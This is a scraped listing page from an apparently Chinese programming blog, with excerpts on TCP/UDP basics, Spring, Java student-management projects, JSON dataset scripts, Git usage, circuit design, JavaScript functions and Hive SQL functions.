16位端口号：源端口号，主机该报文段是来自哪里；目标端口号，要传给哪个上层协议或应用程序32位序号：一次TCP通信（从TCP连接建立到断开）过程中某一个传输方向上的字节流的每个字节的编号。32位确认号：用作对另一方发送的tcp报文段的响应。其值是收到的TCP报文段的序号值加1。4位头部长度：表示tcp头部有多少个32bit字（4字节）。因为4位最大能标识15，所以TCP头部最长是60字节。6位标志位：URG(紧急指针是否有效)，ACk（表示确认号是否有效），PSH（缓冲区尚未填满），RST（表示要求对方重新建立连接），SYN（建立连接消息标志接），FIN（表示告知对方本端要关闭连接了）16位窗口大小：是TCP流量控制的一个手段。这里说的窗口，指的是接收通告窗口。它告诉对方本端的TCP接收缓冲区还能容纳多少字节的数据，这样对方就可以控制发送数据的速度。16位校验和：由发送端填充，接收端对TCP报文段执行CRC算法以检验TCP报文段在传输过程中是否损坏。注意，这个校验不仅包括TCP头部，也包括数据部分。这也是TCP可靠传输的一个重要保障。16位紧急指针：一个正的偏移量。它和序号字段的值相加表示最后一个紧急数据的下一字节的序号。因此，确切地说，这个字段是紧急指针相对当前序号的偏移，不妨称之为紧急偏移。TCP的紧急指针是发送端向接收端发送紧急数据的方法。 TCP有哪些特点？ TCP是面向连接的运输层协议。点对点，每一条TCP连接只能有两个端点。TCP提供可靠交付的服务。TCP提供全双工通信。面向字节流。 TCP和UDP的区别？ TCP面向连接；UDP是无连接的，即发送数据之前不需要建立连接。TCP提供可靠的服务；UDP不保证可靠交付。TCP面向字节流，把数据看成一连串无结构的字节流；UDP是面向报文的。TCP有拥塞控制；UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如实时视频会议等）。每一条TCP连接只能是点到点的；UDP支持一对一、一对多、多对一和多对多的通信方式。TCP首部开销20字节；UDP的首部开销小，只有8个字节。 TCP 和 UDP 分别对应的常见应用层协议有哪些？ 基于TCP的应用层协议有：HTTP、FTP、SMTP、TELNET、SSH
HTTP：HyperText Transfer Protocol（超文本传输协议），默认端口80FTP: File Transfer Protocol (文件传输协议), 默认端口(20用于传输数据，21用于传输控制信息)SMTP: Simple Mail Transfer Protocol (简单邮件传输协议) ,默认端口25TELNET: Teletype over the Network (网络电传), 默认端口23SSH：Secure Shell（安全外壳协议），默认端口 22 基于UDP的应用层协议：DNS、TFTP、SNMP
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a391f605a3c498c2b62f9904a47965fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/187beb839e40a69953ba77a9546b63d6/" rel="bookmark">
			Spring框架设计哲学[一定要懂]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着国内经济飞速发展，作为赋能的it技术也是飞速迭代，如何快速掌握一门技术对开发人员来说是极其重要的。下面来自官方的一段话，通过safari翻译给到你。当你了解一个框架时，不仅要知道它的作用，还要知道它遵循什么原则，这一点很重要。以下是Spring框架的指导原则：
在各个层面提供选择。Spring可以让你尽可能晚地推迟设计决策。例如，您可以在不更改代码的情况下通过配置切换持久化组件。许多其他基础设施问题以及与第三方API的集成也是如此。适应不同的观点。Spring拥抱灵活性，对应该如何做事不固执己见。它支持不同视角的广泛应用需求。保持强大的向后兼容性。Spring的演变经过精心管理，迫使版本之间几乎没有突破性变化。Spring支持一系列精心选择的JDK版本和第三方库，以促进依赖Spring的应用程序和库的维护。关心API设计。Spring团队投入了大量思考和时间来制作直观且在许多版本和许多年中具有的API。为代码质量设定高标准。Spring框架非常强调有意义、当前和准确的javadoc。这是为数不多的可以声称在软件包之间没有循环依赖关系的干净代码结构的项目之一。 这些原则指导了后续Spring编码的实现.同时也能借鉴这些原则提升我们的编码水平
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/795598080e3c4f6defd7c30248d10c26/" rel="bookmark">
			史上最详细的JAVA学生信息管理系统（MySQL实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、项目介绍 为了巩固Java的学习写了一个基于MVC设计模式的学生管理系统。
简单介绍一下MVC设计模式：
1、M也就是Model 模型层（也叫数据层）主要是通过这个类来进行数据的操作。
2、V是Views 视图层，主要就是来显示页面信息。
3、C是Controller控制器，主要是用来做流程调度。
开发工具：IDEA、MySQL-5.5、Navicat、mysql-connector-java-5.0.8
二、项目分析 1.目录结构 这些就是这个项目的结构。
2.需求分析 首先进行登录，如果没有账户可以进行注册。
学生处理：
实现对于学生信息的增删改查。
每个用户都有自己的权限比如超级管理员可以进行学生信息的增删改查。
用户处理：
超级管理员可以进行用户信息的增删改（这里的改是只可以修改用户的权限）。
而普通用户是不可以对用户信息进行操作的。
以上介绍下面的图很清晰的写了出来。
三、数据库建表 1.创建学生表 字段分别为学号、姓名、性别、年龄、成绩、电话、班级。
这是一些测试数据以便进行系统的测试。
2.用户表 建表的方式跟学生表的一样我这里就不展示了。
用户表的字段为用户序号、用户名、密码、权限（0 - 超级管理员、1 - 普通管理员、2 - 普通用户）。
四、项目介绍及效果图 这是项目所用到的全部类。
1、controller这个包里存放了两个类分别是学生调度器和用户调度器，主要就是进行流程调度。
2、global这个包里存放的分别是JDBC工具类用来连接数据库从库里获取到数据，剩下的两个就是自定义的学生类和用户类。
3、model这个包里也就是模型层这两个模型层的作用是分别来处理学生数据和用户数据。
4、views这个包是视图层主要是在这里面进行数据的展示还有一些提示信息。
5、StuManagerMain是启动项，从这里开始运行程序。
6、最重要的一点就是最下面的那个.jar包，首先要将这个包导入才可以进行连接数据库的操作，具体步骤这里我就不过多赘述，可以自行查找。
1.登录界面（效果图） (1) 注册
从这里可以选择要操作的序号，没有账号可以选择注册
这里选择注册，在输入用户名的时候程序会判断是否跟已存在的用户重名，如果重名则需重新输入
这里输入密码，接下来确认密码，提示注册成功将会自动登录，这里默认权限为普通用户
(2) 登录
这里就是登录成功之后展示的页面，在这里要进行管理用户或是学生的选择。
2.权限说明（效果图） 我在之前说到了权限的问题，这个账号的权限是超级管理员，我来登录一个普通用户看看还能否选择管理用户。
很明显在这里给出了提示说不能操作。
选择管理学生信息这里也是提示普通用户只能进行查看学生信息。
普通管理员可以进行进入管理用户信息，但是只可以进行查找
普通管理员在管理学生信息时候只可以进行查找和增加的操作
3.管理用户信息（效果图） 我登录超级管理员的账号来进行接下来的操作，在用户管理我没有弄增加用户信息，增加的操作是让用户在注册那里进行
(1) 查询用户信息
选择查找用户信息，显示出了查询的二级菜单，这里可以根据id、姓名、权限进行查找
选择根据姓名查找，输入用户名之后显示出来了该用户的信息
如果输入的用户名查询不到也会给出提示说用户信息不存在
(2) 修改用户信息
选择修改用户信息，这里修改的信息只能是权限，其他的用户信息是无法修改的
在选择修改后会给出该用户当前是什么权限，这里将root用户的权限修改为普通用户
可以看到成功将权限修改为普通用户
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/795598080e3c4f6defd7c30248d10c26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3c322301f44cca3adee638446a43d5c/" rel="bookmark">
			对顶堆模板：求动态数组的中位数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模板 priority_queue&lt;int&gt; l; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; r; void insert(int x) { if (!l.size() || x &lt;= l.top()) l.push(x); else r.push(x); if (l.size() &gt; r.size() + 1) r.push(l.top()), l.pop(); if (r.size() &gt; l.size()) l.push(r.top()), r.pop(); } 讲解视频： https://www.acwing.com/video/1663/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1a9661b1f9d861d72ca7fd22d7cc49c/" rel="bookmark">
			json格式的数据集中每一条数据5个选项随机去掉一个错误选项，剩余选项重新排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		json文件中每一条数据5个选项随机去掉一个错误选项，剩余选项重新排序 json格式的数据集中含有5个选项，随机去掉一个错误选项，剩余选项重新排序。
数据集示例：
[ { "context": "由于饮食中的高脂肪含量，新加坡人的心血管疾病的发病率也逐年上升。", "question": "从上述断定，最可能推出以下哪项结论", "A": "新加坡人的心血管疾病的发病率虽然逐年上升，但这种疾病不是造成目前新加坡人死亡的主要杀手", "B": "目前，新加坡对于心血管病的治疗水平是全世界最高的", "C": "20世纪60年代造成新加坡人死亡的那些主要疾病，到21世纪，如果在该国的发病率没有实质性的降低，那么对这些疾病的医治水平一定有实质性的提高", "D": "目前，新加坡人心血管疾病的发病率低于日本", "E": "新加坡人比日本人更喜欢吃脂肪含量高的食物", "answer": "C" }, { "context": "有人养了一些兔子。别人问他有多少只雌兔，多少只雄兔？他答：在他所养的兔子中，每只雄兔的雌性同伴比它的雄性同伴少1只：而每只雌兔的雄性同伴比它的雌性同伴的两倍少2只", "question": "根据上述回答，可以判断他养了多少只雌兔？多少只雄兔", "A": "8只雄兔，6只雕兔", "B": "10只雄兔，8只雌兔", "C": "12只雄兔，10只雌兔", "D": "14只雄兔，8只雌兔", "E": "14只雄兔，12只雌兔", "answer": "A" } ] 目的：例如第一题，正确答案为C，除正确答案外，我想随机去掉一个错误选项。
例如：去掉错误A选项，那么剩下的BCDE选项应该变为ABCD选项；如果去掉错误选项D选项，那么剩下的ABCE选项应该变为ABCD选项。
import os import random import json import string path = "test.json" file = open(path, encoding='utf-8') jsondata = json.load(file) json_all = [] json_new = [] for i in range(len(jsondata)): right_answer = jsondata[i]['answer'] #读取正确答案 dicta = {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1a9661b1f9d861d72ca7fd22d7cc49c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2624804f4bfc40a8fbe1b305979cd419/" rel="bookmark">
			读取一个json文件中的部分内容写入另一个json文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读取一个json文件中的部分内容写入另一个json文件 首先是第一个json文件：
[ { "id": 1, "context": "Xiao Li was admitted to Tsinghua University.", "question": "Which of the following conditions should be added to conclude that Xiao Li was admitted to Tsinghua University?", "A": "At least one of Xiao Zhang and Xiao Li failed to enter Tsinghua University.", "B": "Both Xiao Zhang and Xiao Sun have been admitted to Peking University.", "answer": "B" }, { "id": 2, "context": "If it is an unchangeable fact that you can't have your cake and eat it, then either of the following must also be true "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2624804f4bfc40a8fbe1b305979cd419/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2337abe99f3586def529c24d7350bc10/" rel="bookmark">
			Git的下载、安装、配置、使用、卸载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 我是跟着狂神老师学的。该博客仅用于笔记所用。
下面是老师的B站和笔记
B站：https://www.bilibili.com/video/BV1FE411P7B3?p=1&amp;vd_source=9266cf72b1f398b63abe0aefe358d7d6
笔记：https://mp.weixin.qq.com/s/Bf7uVhGiu47uOELjmC5uXQ
一、准备工作 学习所有东西的第一步，都是去官网或者百度百科，对它进行全面的了解，知道它的应用场景和意义。然后，下载、安装、配置！
1、为什么学这玩意 版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。
Git是目前世界上最先进的分布式版本控制系统。
2、下载和安装 Git官网：https://git-scm.com/
在官网中可以下载Git，但是在国外，下载很慢，需要使用淘宝镜像下载：http://npm.taobao.org/mirrors/git-for-windows/
一般选择比较新的稳定版本下载即可，注意文件名要带有windows，以v2.39.2为例
Windows选择64位的exe文件即可
两秒钟下载完毕
双击exe文件进行安装
除了我贴的图需要注意，其他几步直接点击next（就是使用默认参数即可）
选择安装路径
选择需要的组件，正常直接点击next
选择默认文本编辑器，我选默认的Vim
一路next
全部取消勾选，安装结束
在任意文件夹，右键出现这个就是安装成功了。常用的是Git Bash
在桌面右键-选择Git Bash
按住ctrl，通过鼠标滚轮可以调整文字大小
可以测试一些常用的linux命令，这里就不演示了
关于更多linux的常用命令，这个博客写的很好
https://blog.csdn.net/weixin_38407447/article/details/90581454
环境变量不用管，会自动配置好
3、配置 随便建立一个文件夹，我这里在桌面建立了一个testGit，在文件夹右键打开Git bash
先设置用户名和邮箱，依次输入下面的命令即可,加粗部分是需要自己替换的：
git config --global user.name “jy”
git config --global user.email 23123@qq.com
设置完成后，查看配置
git config -l 可以看到配置成功了
二、使用方法 使用一个工具之前，最好了解它的原理，再去学习各种使用方法！
1、原理 1）工作区域 左边这三个命令很常用
2）工作流程 2、在码云或GitHub配置ssh公钥 常见的代码托管平台有码云（即Gitee）和GitHub。因为GitHub在国外，进去很慢，所以这里主要讲解码云。
码云：https://gitee.com/
GitHub：https://github.com/
首先自己注册一个码云账户
之后需要配置ssh公钥
在任意位置打开Git Bash，输入 cd ~/.ssh进入.ssh 文件夹
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2337abe99f3586def529c24d7350bc10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48a9efcd5bd8591b75357d52649fc572/" rel="bookmark">
			json文件，value值中带英文引号导致报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		json文件，value值中带英文引号导致报错 json文件，value值中带英文引号导致报错首先运行结果 json文件，value值中带英文引号导致报错 举例说明：
{ "id": 1, "context": "Xiao Li was admitted to Tsinghua University, or Xiao Sun failed to enter Peking University.", "question": "Which of the following conditions should be added to conclude that "Xiao Li was admitted to Tsinghua University"?", "A": "At least one of Xiao Zhang and Xiao Li failed to enter Tsinghua University.", "B": "Both Xiao Zhang and Xiao Sun have been admitted to Peking University.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48a9efcd5bd8591b75357d52649fc572/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2938fdc2d58975328f4f4a432cff52de/" rel="bookmark">
			电子设计竞赛2020年E题从电路到代码，电路篇详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这道电赛题对于入门信号题的童学是一个很好的阶梯，从中大家可以看到与书本上一样的图像，而且做完会很有成就感。
楼主焊的很丑，希望大家不要有良好的审美观，不要像我学习。
这是我第一个做出来的信号题，顺便来详细讲一下我的制作步骤，当然里面也有很多讲解不是那么专业，欢迎大家来指错，楼主心里承受能力很强，随便骂我都可以的。
楼主的双非学校，上课讲模电知识时对三极管的顶部失真，顶部失真等等，基本都是一笔带过。制作起来只能大量的查找资料。
听说西北模电王，杨老师的模电课很不错就去B站看了一下，发现真的是新大陆，我感觉这才是模电精髓。
如果你上课学习模电时，感觉老师讲的很浅，可以来看看杨老师的新概念模电，来深入模电的海洋。
讲了这么多，现在开始正题，来讲解电路。我用的仿真软件是TINA，大家用multisim也是差不多的。
这个电路上的哪个缺角是因为我暂停的时候出现的，频率太高了，导致其晃动。
在华科那本模电书上的184页介绍了这种电路，基极分压式射级偏置电路。这是一级放大，为什么要专门设计一个放大电路，大概是示波器精度不够，而且直接显示20mv的峰峰值噪声会很大，波形看起来会很跳动。（我这个回答很不专业，希望有人能讲一下更好的解释。）
我第一次焊这个电路是踩过很多坑，比如三极管的放大倍数是多少，这个是需要自己在万用表测出来的，我当时不知道，发现焊出来的电路波形和仿真的波形相差巨大，踩了很多坑才知道，三极管在万用表有一个专门的挡位来测量。
ss8050，放大倍数差不多是240
这样测出来的就是放大倍速然后在软件设置里调三极管的放大倍数。
这样基本上就没有太大的问题了。
现在开始讲解二级放大，二级放大就开始准备失真了。新概念模电晶体管篇68页，很好的解释了截止失真和饱和失真。
那如何输出双向失真呢？即截止又饱和，首先将R1的阻值调大，让该处的结点电压降低，因此电路相对来说处于截止状态。
电流Ic也因此很小，但是只要将集电极处的电阻阻值调大，即使是小电流，也会分走大部分的电压，让Vc电压变得小，使电路处于饱和状态。因此即截止又饱和就完成了。
现在是仿真时间，根据学习的模电知识，改变电阻阻值，让电流变小，变大都由你来决定。
不要学我，做的这么丑
其他电阻阻值不动，一步一步的改变R7的阻值让你的顶部失真好看一点。
我现在才发现原来我的图像那么丑
其他电阻阻值不变，改变R9的阻值，你就可以得到底部失真的图像，当然还是选择好看的那个。
这个也很丑
唯一一个很漂亮的图形
从现在开始还差最后一个交越失真的电路就完成了。其实这个不难，只是你还没学到。
我当时做设计这个电路时也是无意中翻到，然后就设计出来了，华科那本模电405页。新概念也讲了在第四本，但是我一直看的视频，书混在别的地方了。
不懂的地方可以直接在评论区问我，楼主会尽力的解释。虽然可能极其不专业。有时间我出第二部代码篇。
随便炫耀一下，一位可爱，漂亮的同学送给我酸奶。（不是打广告）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e24d1691737e7f27d2714282175b09/" rel="bookmark">
			Git使用教程、命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Git使用教程、命令 Git 本文连接：https://blog.csdn.net/leiduifan6944/article/details/129432110
git官网 https://git-scm.com/
优势：
大部分操作在本地完成，无需联网 完整性保证 尽可能添加数据而不是删除或修改数据 分支操作非常快捷流畅 与linux命令全面兼容 工作区、暂存区、本地库 工作区：编辑、增删改查 暂存区：保存工作区提交上来的记录 本地库：将暂存区的历史记录保存到本地库持久化 工作区 —— git add —— 暂存区 ——git commit —— 本地库 —— push/pull —— 远程库 代码托管中心：远程库 内网：gitlab 外网：github、码云 本地库——push——远程库 远程库——pull——本地库 基本配置 git的配置文件位置： win: c:\users\&lt;userName&gt;\.gitconfig linux: /home/&lt;userName&gt;/.gitconfig # 个人 /etc/gitconfig # 系统全局 # 修改git init时的默认分支为master， 但gitlab上创建仓库时默认分支是main，可以修改git init的默认参数，使其初始化为main 1）、直接修改配置文件 如果已有[init]则修改其下配置，如果没有，则新增，其他配置项不变： ... [init] defaultBranch = main	# 修改默认初始化分支 2）、命令设置 git config init.defaultBranch # 查看默认分支 git config --global init.defaultBranch "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01e24d1691737e7f27d2714282175b09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3174e8c518e135a04520471b6b5497d/" rel="bookmark">
			Java 学生信息管理系统-窗体程序 有详细设计文档和报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天为大家分享一个java语言编写的学生信息管理系统，目前系统功能已经很全面，后续会进一步完善。整个系统界面漂亮，有完整得源码，希望大家可以喜欢。喜欢的帮忙点赞和关注。一起编程、一起进步
开发环境 开发语言为Java，开发环境Eclipse或者IDEA都可以。数据库采用：MySQL。运行主程序，或者执行打开JAR文件即可以运行本程序。
系统框架 利用JDK自带的SWING框架开发，不需要安装第三方JAR包。MySQL数据库，纯窗体模式，直接运行Main文件即可以。同时带有详细得设计文档
主要功能 开发背景 随着高校的扩招，需要处理的学生信息日趋加大，不仅花费大量的教师资源，处理的效率还十分低下。为提高学生管理的管理水平，优化资源，尽可能降低管理成本成为学生管理的新课题，学生管理系统是从学生管理现状出发，根据学生管理的新要求进行开发设计的，它解决了学生管理数据信息量大，修改不方便，对一系列数据进行分析时花费时间长等问题，帮助学生管理人员有效管理学生信息，成为管理高校中必不可少的管理工具。
主要功能 本次课程设计开发一个学生管理系统，系统中分两类系统管理员和普通学生。系统管理员能对系统中的学生进行查询，增加，删除，修改，分页显示，Excel导出学生信息等。
运行效果 1 用户登陆 2 主界面 3 添加学生界面 4 学生信息查询 5 学生查询结果展示 6 关于系统 7 导出Excel 核心代码 /* * 登陆成功后主界面 */ public class MainMenu extends JFrame implements ActionListener{ private JFrame mainmenu; private JTextArea text; private JMenu menuFile1, menuFile2, menuFile3; private JMenuBar menuBar1; private JMenuItem addStudentInfo,queryStudentInfo, modifyPassword,Exit; private JMenuItem importExcel,importTxt, outputExcel,outputTxt; private JMenuItem aboutSystem,help; public MainMenu() { mainmenu(); } public void mainmenu() { // TODO Auto-generated method stub text = new JTextArea("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3174e8c518e135a04520471b6b5497d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15e08aab844f9446e1dbe73ae632442e/" rel="bookmark">
			链式法则的求导证明（复合函数求导）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		链式法则的求导证明（复合函数求导） 本文给出两种证明方式，第一种高等数学（复杂），第二种维基百科（简单） 一：同济大学高等数学教材给的证明： 二：维基百科给的证明 以下给出一个简单的证明：
设函数 和 , 其中 x 为自变量，f(g(x))在个g(x)处可导 ,g(x)在x出可导。
根据可导的定义得：
其中当时
（这里的 就是高等数学书上说的增量 Δx）
同理：
其中时
现在
其中：
注意到当 时。及因此 因此
证明得毕。
参考资料：同济大学高等数学教材 第六版上册
维基百科：Wikipedia：https://zh.wikipedia.org/wiki/é¾å¼æ³å
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c87420d5b4adf3deefeb2ab9b43eda4f/" rel="bookmark">
			JS学习第11天——函数进阶（this指向、严格模式、高阶函数、闭包、递归）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、函数的定义和调用1、函数的定义方式2、函数的调用方式 二、this1、this指向2、改变this指向 三、严格模式1、为脚本开启严格模式2、为函数开启严格模式3、严格模式中的变化 四、高阶函数五、闭包1、闭包（closure）2、在chrome中调试闭包3、闭包的作用4、思考题 六、递归1、求1*2*3*...*n的阶乘2、求斐波那契数列3、根据ID返回对象的数据 一、函数的定义和调用 1、函数的定义方式 ①自定义函数（命名函数） ②函数表达式（匿名函数）③new Function()（效率低，很少使用）
所有函数都是Function的实例对象，函数也属于对象
2、函数的调用方式 6种函数：① 普通函数 ②对象的方法 ③构造函数 ④绑定事件函数 ⑤定时器函数 ⑥立即执行函数
// 调用方式 // 1.普通函数 function fn(){}; fn(); fn.call() // 2.对象的方法 var obj = { sayHi: function () {}, }; obj.sayHi(); // 3.构造函数 function Star() {} new Star(); // 4.绑定事件函数 btn.onclick = function () {}; // 5.定时器函数 setTimeout(function () {}, 1000); // 6.立即执行函数 (function () {})(); 二、this 1、this指向 调用方式this指向普通函数调用window构造函数调用实例对象，原型对象里面的方法也指向实例对象对象方法调用该方法所属对象事件绑定方法绑定事件对象定时器window立即执行函数window 2、改变this指向 JS中改变this指向的方法有：① bind() ②call() ③apply()方法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c87420d5b4adf3deefeb2ab9b43eda4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7eb6a002c8df66cf4c8faab031420aea/" rel="bookmark">
			db2在执行插入或者更新时报【ERRORCODE=-4499，SQLSTATE=58009】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题出现情况： 在进行数据更新或是插入操作时出现，经测试可能与一次性执行的数据量较大导致；
解决方式： 解决思路：减少每次处理的数量
可以将执行条件细化，缩小每次要处理的数据范围；可以建立中间表存储相关数据并进行排序，分页进行数据的操作； 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ad91ab70cc2a197a4ec0c02fd8e7030/" rel="bookmark">
			Ubuntu 20.04 通过ifconfig修改静态ip无法联网，重置设置后恢复网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu 20.04 通过ifconfig修改静态ip无法联网，重置设置后恢复网络 背景 系统：Ubuntu 20.04
操作：
1、通过ifconfig将电脑设置为静态ip
2、接着发现无法连接网络，且电脑右上角的网络连接图标多了一个问号标识。
3、访问浏览器时会报错DNS_PROBE_FINISHED_BAD_CONFIG。
常规手段无效 https://kinsta.com/knowledgebase/dns_probe_finished_bad_config/
https://askubuntu.com/questions/622470/dns-probe-finished-bad-config-error-in-ubuntu-14-04
ubuntu网络设置还原
ubuntu重置网络设置
最终解决方案 通过插别人的网线来观测，发现在使用ifconfig修改ip的过程中，DNS被污染了，所以最简单的方法就是重置网络连接的配置。
经过不懈努力，终于找到了：
移除错误的之后，点击一下+号，让自动生成新的动态配置即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddedcbdf8ac0210e0e38eea9763ed7a4/" rel="bookmark">
			学习ArcGIS Maps SDK for Kotlin(200)系列 003-android studio离线环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：本篇文章主要介绍依赖库的配置和地图显示
文章目录 环境配置源码如下总结 环境配置 将下载的离线包中arcgis-maps-kotlin-200.0.0-beta01.aar、arcgis-maps-kotlin-200.0.0-beta01.pom拷贝到项目libs文件 夹
在android studio中新建project，在build.gradle（project）中添加以下代码：
repositories { google() jcenter() //添加以下代码 maven { url 'https://esri.jfrog.io/artifactory/arcgis' } // } 接着在build.gradle（Module）中添加以下依赖：
dependencies { implementation 'androidx.core:core-ktx:1.8.0' implementation 'androidx.appcompat:appcompat:1.5.1' implementation 'com.google.android.material:material:1.7.0' implementation 'androidx.constraintlayout:constraintlayout:2.1.4' implementation 'androidx.core:core-ktx:1.7.0' testImplementation 'junit:junit:4.13.2' androidTestImplementation 'androidx.test.ext:junit:1.1.3' androidTestImplementation 'androidx.test.espresso:espresso-core:3.4.0' // 添加如下： implementation "com.esri:arcgis-maps-kotlin:200.0.0-beta01" } 在build.gradle（Module）中添加databinding：
repositories { google() mavenCentral() maven { url 'https://esri.jfrog.io/artifactory/arcgis' } } 打开AndroidManifest.xml文件，为app添加网络访问权限:
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.app"&gt; &lt;uses-permission android:name="android.permission.INTERNET"/&gt; 基本设置已完成
源码如下 activity_main.xml
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;layout xmlns:android="http://schemas.android.com/apk/res/android"&gt; &lt;androidx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddedcbdf8ac0210e0e38eea9763ed7a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61412d84c82911e66827cea812560aa9/" rel="bookmark">
			git覆盖仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.远程覆盖本地
git fetch --all
git reset --hard origin master
git pull origin 2.本地覆盖远程
git push --force origin master
如果出现了仓库提交混乱的情况，Git报错：Another git process seems to be running in this repository
就执行rm -f .git/index.lock，即删除掉这个文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abc1ed6aef4f19ec2ce0077197e51c74/" rel="bookmark">
			IDEA 控制台输出中文乱码的简单解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 引言解决方案第一步第二步下载JDK选择现有的JDK 完成 引言 很多人（包括我）在编程的时候可能会发现：在IDEA的控制台输出中文字符的时候，会出现乱码，如下图：
于是就在网上搜了很多教程，结果弄完了却还是不行。下面是我的解决方案：
解决方案 其实，问题出在JDK上：JDK18开始，编码变成GBK了，不再是UTF-8，而IDEA的默认配置又是UTF-8，所以，最简单的解决方法就是换成JDK17或更低，如下：
第一步 打开 文件-项目设置，并点击图片中的选项：
然后选择圆圈里的选项，这里下载一个新的或者导入现有的都可以：
第二步 上图右边的圆圈里两个选项都可以选，看实际情况，以下是这两种方案：
下载JDK 点第一个选项“下载JDK…”后，按图示操作：
下载完成后选择新下载的JDK就可以了
选择现有的JDK 点第二个选项“JDK…”后，在弹出的页面里选择jdk的文件夹即可。
完成 完成后再次测试，发现可以正常输出了。
以上就是IDEA控制台输出中文乱码的简单解决方案，喜欢请关注我吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a3b3cc70f1fe4942e2b00859b841514/" rel="bookmark">
			大数据框架之Hive：第8章 函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第8章 函数 8.1 函数简介 Hive会将常用的逻辑封装成函数给用户进行使用，类似于Java中的函数。
好处：避免用户反复写逻辑，可以直接拿来使用。
重点：用户需要知道函数叫什么，能做什么。
Hive提供了大量的内置函数，按照其特点可大致分为如下几类：单行函数、聚合函数、炸裂函数、窗口函数。
以下命令可用于查询所有内置函数的相关信息。
1）查看系统内置函数
hive&gt; show functions; 2）查看内置函数用法
hive&gt; desc function upper; 3）查看内置函数详细信息
hive&gt; desc function extended upper; 8.2 单行函数 单行函数的特点是一进一出，即输入一行，输出一行。
单行函数按照功能可分为如下几类: 日期函数、字符串函数、集合函数、数学函数、流程控制函数等。
8.2.1 算术运算函数 运算符描述A+BA和B 相加A-BA减去BA*BA和B 相乘A/BA除以BA%BA对B取余A&amp;BA和B按位取与ABA^BA和B按位取异或~AA按位取反 案例实操：查询出所有员工的薪水后加1显示。
hive (default)&gt; select sal + 1 from emp; 8.2.2 数值函数 1）round：四舍五入
hive&gt; select round(3.3); 3 2）ceil：向上取整
